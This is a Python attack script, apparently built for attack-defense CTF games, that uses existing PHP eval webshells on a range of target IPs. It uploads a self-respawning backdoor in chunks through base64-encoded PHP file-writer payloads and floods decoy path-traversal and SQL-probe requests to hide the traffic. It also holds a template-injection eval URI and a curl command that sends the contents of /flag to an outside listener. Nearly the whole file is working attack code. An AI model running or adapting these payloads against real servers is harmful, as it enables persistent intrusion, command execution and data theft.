# coding:utf-8

# 作者：nealwe
# 时间：2018/8/13
# 需要实现的功能有 '扫描本地网站的一句话木马' -> '立刻注释掉一句话' -> '生成攻击payload' -> '执行命令'

import os
import paramiko
import re
import sys, requests, base64
import socket
import fcntl
import struct
import hashlib
import random
import threading
import time
from multiprocessing import Process


# 子进程要执行的代码
def while_send_useless(url, passwd, Rpath, method, shell_content):  # 流量混淆
    data = {}
    url_part = ["/../../../../../../../../../../../etc/passwd",
                "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2fetc/passwd", "?id=1'", "", "", ""]
    url = str(url) + random.choice(url_part)
    shell_content = """<?php

                        set_time_limit(0);

                        ignore_user_abort(1);

                        unlink(__FILE__);

                        while(1){

                            file_put_contents('path/webshell.php','<?php @eval($_POST["password"]);?>');

                        }

                    ?>"""[:100]
    if method == "post":
        data[passwd] = "@eval(base64_decode($_POST['z0']));"
        data[
            'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwncicpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
        data['z1'] = base64.b64encode(Rpath + "/fckyou.php")
        data["z2"] = base64.b64encode(shell_content)
        data['z0'] = data['z0'][random.randint(1, 10):random.randint(10, len(data['z0']))]
        for i in range(100):
            res = requests.post(url, data=data)
            # print "send_useless....."
    elif method == "get":
        data[passwd] = "@eval(base64_decode($_GET['z0']));"
        data[
            'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ3InKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
        data['z1'] = base64.b64encode(Rpath + "/fxck.php")
        data["z2"] = base64.b64encode(shell_content)
        for i in range(100):
            res = requests.get(url, params=data)
    else:
        print "method error!"
        sys.exit()
    # 判断是否上传成功,失败直接跳过
    # print res.content
    if res.status_code != 200:
        # print "[-] %s upload failed!" % url
        return 0
    else:
        pass


def get_host_ip(url, method, passwd):
    data = {}
    try:
        data[passwd] = "echo '>>>'.$_SERVER[\"REMOTE_ADDR\"].'<<<';"
        if method == "post":
            try:
                res = requests.post(url, data=data)
            except:
                res = ''
                print "[-] %s Shell has already been Deleted" % url
        elif method == "get":
            # 在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
            try:
                res = requests.get(url, params=data)
            except:
                res = ''
                print "[-] %s Shell has already been Deleted" % url
        else:
            res = ''
            print "method error!"
        ip = re.findall(r">>>(.*?)<<<", res.content)[0]
    except:
        ip = '空'
        pass
    print "IP:" + ip
    return ip


def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)  # 去重
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList


def md5(string):
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()


class ScanAndAttack():
    def __init__(self, shell_local_path):
        self.shell_local_path = shell_local_path

    def Scan(self):
        pass

    def Shell(self):
        pass

    def Attack(self):
        pass

    def send_split_useful(self, url, passwd, Rpath, method, shell_content):
        data = {}
        if method == "post":
            data[passwd] = "@eval(base64_decode($_POST['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwnYScpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            # print data
            try:
                res = requests.post(url, data=data)
            except:
                print "[-] %s Shell has already been Deleted" % url
        elif method == "get":
            data[passwd] = "@eval(base64_decode($_GET['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ2EnKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            # 在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
            try:
                res = requests.get(url, params=data)
            except:
                print "[-] %s Shell has already been Deleted" % url
        else:
            print "method error!"
            sys.exit()
        # 判断是否上传成功,失败直接跳过
        # print res.content
        if res.status_code != 200:
            print "[-] %s upload failed!" % url
            return 0
        else:
            # print "send_split_useful....."
            pass

    def send_useless(self, url, passwd, Rpath, method, shell_content):  # 流量混淆
        data = {}
        url_part = ["/../../../../../../../../../../../etc/passwd",
                    "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                    "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2fetc/passwd", "?id=1'", "", "", " "]
        url = url + random.choice(url_part)
        shell_content = """<?php

                            set_time_limit(0);

                            ignore_user_abort(1);

                            unlink(__FILE__);

                            while(1){

                                file_put_contents('path/webshell.php','<?php @eval($_POST["password"]);?>');

                            }

                        ?>"""[:100]
        if method == "post":
            data[passwd] = "@eval(base64_decode($_POST['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwncicpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            for i in range(random.randint(1, 10)):
                res = requests.post(url, data=data)
                # print "send_useless....."
        elif method == "get":
            data[passwd] = "@eval(base64_decode($_GET['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ3InKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            res = requests.get(url, params=data)
        else:
            print "method error!"
            sys.exit()
        # 判断是否上传成功,失败直接跳过
        # print res.content
        if res.status_code != 200:
            # print "[-] %s upload failed!" % url
            return 0
        else:
            pass

    def send_full_useful(self, url, passwd, Rpath, method, shell_content):
        data = {}
        if method == "post":
            data[passwd] = "@eval(base64_decode($_POST['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwndycpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            # print data
            try:
                res = requests.post(url, data=data)
                print "send_full_useful....."
            except:
                print "[-] %s Shell has already been Deleted" % url
        elif method == "get":
            data[passwd] = "@eval(base64_decode($_GET['z0']));"
            data[
                'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ3cnKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
            data['z1'] = base64.b64encode(Rpath + "/fuck.php")
            data["z2"] = base64.b64encode(shell_content)
            # 在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
            try:
                res = requests.get(url, params=data)
            except:
                print "[-] %s Shell has already been Deleted" % url
        else:
            print "method error!"
            sys.exit()
        # 判断是否上传成功,失败直接跳过
        # print res.content
        if res.status_code != 200:
            print "[-] %s upload failed!" % url
            return 0
        else:
            print "send_full_useful....."

    # 获取靶机的绝对路径
    def getpath(self, url, method, passwd):
        data = {}
        if method == "get":
            data[passwd] = '@eval(base64_decode($_GET[z0]));'
            data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
            res = requests.get(url, params=data)
            return res.content.strip()
        elif method == "post":
            data['pass'] = 'Sn3rtf4ck'
            data[passwd] = '@eval(base64_decode($_POST[z0]));'
            data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
            res = requests.post(url, data=data)
            # print data
            return res.content.strip()
        else:
            return 0

    # 加载要上传的后门内容

    def loadfile(self, filepath):
        try:
            file = open(filepath, "rb")
            a = file.read()
            return a
        except:
            print "File %s Not Found!" % filepath
            sys.exit()

    # 写马函数
    def cmd(self, url, method, passwd, myRealip, myPassWord, myPort, curl):
        # http://127.0.0.1:80/1110/x.php,post,x
        '''
        1.http or https
        2.端口要放在ip变量中
        3.Rfile  /1110/x.php
        '''
        try:
            url.index("http")
            # 去除http://   ==> 127.0.0.1:80/1110/x.php
            urlstr = url[7:]
            lis = urlstr.split("/")
            ip = str(lis[0])
            Rfile = ""
            for i in range(1, len(lis)):
                Rfile = Rfile + "/" + str(lis[i])
        except:
            urlstr = url[8:]
            lis = urlstr.split("/")
            ip = str(lis[0])
            Rfile = ""
            for i in range(1, len(lis)):
                Rfile = Rfile + "/" + str(lis[i])
        # 判断shell是否存在
        print "test shell"
        try:
            res = requests.get(url, timeout=10)
            mySwitchip = self.get_host_ip(url=url, method=method, passwd=passwd)
            print "[+] %s shell exist!" % url
            webshells = open("webshells.txt", 'a+')
            webshells.write("http://" + ip + "/config.php,%s\n" % md5(md5(myPassWord)))
            webshells.close()
        except:
            print "[-] %s ERR_CONNECTION_TIMED_OUT" % url
            return 0
        if res.status_code != 200:
            print "[-] %s Page Not Found!" % url
            return 0

        # 加载要写入的内容
        shellPath = self.shell_local_path
        htmlroot = open('[Back]网站根目录', 'r').read().split(',')[1]
        shell_content = self.loadfile(shellPath) % (htmlroot, mySwitchip, myRealip, myPort, myPassWord, curl)
        # 获取靶机的绝对路径
        Rpath = self.getpath(url, method, passwd)  # D:/phpStudy/WWW/1110/x.php
        list0 = Rpath.split("/")
        Rpath = ""
        for i in range(0, (len(list0) - 1)):
            Rpath = Rpath + list0[i] + "/"

        # 判断method
        shell_length = len(shell_content)
        for i in range(shell_length // 100):
            start = 100 * i
            end = start + 100
            try:
                part_shell_content = shell_content[start:end]
            except:
                part_shell_content = ''
            if i == (shell_length // 100 - 1):
                part_shell_content = shell_content[start:]
            self.send_useless(url=url, passwd=passwd, Rpath=Rpath, method=method, shell_content=shell_content)
            self.send_split_useful(url=url, passwd=passwd, Rpath=Rpath, method=method, shell_content=part_shell_content)

        # 激活不死马
        list = Rfile.split("/")
        b_url = "http://" + ip
        max = len(list) - 1
        for i in range(1, max):
            b_url = b_url + "/" + list[i]
        bsm_url = b_url + "/fuck.php"
        try:
            res = requests.get(bsm_url, timeout=10)
            print "[-] %s create shell successed!" % bsm_url
        except:
            print bsm_url, "time out!"
            pass

        # 尝试访问不死马生成的shell http://172.17.67.199:80/protected/apps/default/view/mobile/fuck.php
        # shell_url = b_url + "/.index.php"
        shell_url = "http://" + ip + "/config.php"
        res = requests.post(shell_url)
        if res.status_code != 200:
            print "[-] %s 链接返回为空，成功与否不确定，但是不关键，查看crontab，监听一下端口吧。" % shell_url
            # return 0
        # 输出shell地址
        if requests.post(url=shell_url).status_code == 200:
            print "[+] %s upload successed!" % shell_url
        else:
            print requests.post(url=shell_url).content

    def upload(self, ):
        shellstr = self.loadfile("auxi/webshell.txt")
        list = shellstr.split("\r\n")
        # print str(list)
        i = 0
        url = {}
        passwd = {}
        method = {}
        for data in list:
            if data:
                ls = data.split(",")
                method_tmp = str(ls[1])
                method_tmp = method_tmp.lower()
                if method_tmp == 'post' or method_tmp == 'get':
                    url[i] = str(ls[0])
                    method[i] = method_tmp
                    passwd[i] = str(ls[2])
                    i += 1
                else:
                    print "[-] %s request method error!" % (str(ls[0]))
            else:
                pass
        for j in range(len(url)):
            self.cmd(url=url[j], method=method[j], passwd=passwd[j])

    def get_host_ip(self, url, method, passwd):
        data = {}
        try:
            data[passwd] = "echo '>>>'.$_SERVER[\"REMOTE_ADDR\"].'<<<';"
            if method == "post":
                try:
                    res = requests.post(url, data=data, timeout=10)
                    print "[*]switch ip is : ", re.findall(r">>>(.*?)<<<", res.content)[0]
                except:
                    res = ''
                    print "[-] %s Shell has already been Deleted" % url
            elif method == "get":
                # 在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
                try:
                    res = requests.get(url, params=data)
                except:
                    res = ''
                    print "[-] %s Shell has already been Deleted" % url
            else:
                res = ''
                print "method error!"
            ip = re.findall(r">>>(.*?)<<<", res.content)[0]
        except:
            ip = '空'
            pass
        print "IP:" + ip
        return ip

    def md5(self, string):
        m = hashlib.md5()
        m.update(string)
        return m.hexdigest()


def run(target_ip, target_port, target_uri, target_method, target_passwd, myPort, myPassWord, curl):
    url = "http://{}:{}{}".format(target_ip, target_port, target_uri)
    print time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), url
    method = target_method
    passwd = target_passwd
    shell_local_path = "/Users/chendang/Downloads/AWD_nealwe/new_awd/files/undieshell.php"
    a = ScanAndAttack(shell_local_path=shell_local_path)
    data = {
        passwd: "system('whoami');",
    }
    # requests.post(url=url, data=data).content
    # mySwitchip = a.get_host_ip(url=url, method=method, passwd=passwd)
    myRealip = socket.gethostbyname(socket.gethostname())
    # myRealip = 在有些情况下不稳
    myPassWord = myPassWord
    myPort = myPort
    # while_send_useless(url=url,passwd=passwd,Rpath='index.php',method=method,shell_content='')
    p = threading.Thread(target=while_send_useless, args=(url, passwd, 'index.php', method, ''))
    print '[*] 流量混淆 start....'
    p.start()
    a.cmd(url=url, method=method, passwd=passwd, myRealip=myRealip, myPort=myPort, myPassWord=myPassWord, curl=curl)


if __name__ == "__main__":
    target_ips = ip_list("172.17.67.199-200")
    target_port = "80"
    target_uri = "/upload/news/index.php?pages=123{${@eval($_POST[cmd])}}123"
    target_method = "post"
    target_passwd = "cmd"
    curl = r"""'curl 172.17.67.216:5467 --cookie \"SSID=1437_21119; PSINO=3; Hm_lpvt_6859ce5aaf00fb00387e6434e4fcc925=1535649104\" -d \"flag=\`/bin/cat /flag\`\"  -m 3';"""

    #######   记得 改 [Back]网站根目录

    myPassWord = str(random.uniform(10, 20))
    myPort = "8089"  # 反弹的监听端口

    #############################################################################


    files = ['', "attack_IPs", "attack_IPS_2", "[3]IPs-web3", "[3]IPs-web4"]
    target_file = files[1]

    with open(target_file, 'w+') as f:
        for ip in target_ips:
            f.write(ip + "\n")

    print "password:" + md5(md5(myPassWord))

    target_ips = open(target_file, 'r')

    thread_array = {}
    for target_ip in target_ips:
        target_ip = target_ip.strip()
        if target_ip == '':
            continue
        try:
            # run(target_ip=target_ip,target_port=target_port,target_uri=target_uri,target_method=target_method,target_passwd=target_passwd,myPort=myPort,myPassWord=myPassWord)
            print 'Parent process %s.' % os.getpid()
            p = Process(target=run, args=(
            target_ip, target_port, target_uri, target_method, target_passwd, myPort, myPassWord, curl))
            print 'Process will start.'
            p.start()
            # p.join()
            # print 'Process end.'
        except:
            print "{} down!".format(target_ip)

    print 'Process end.'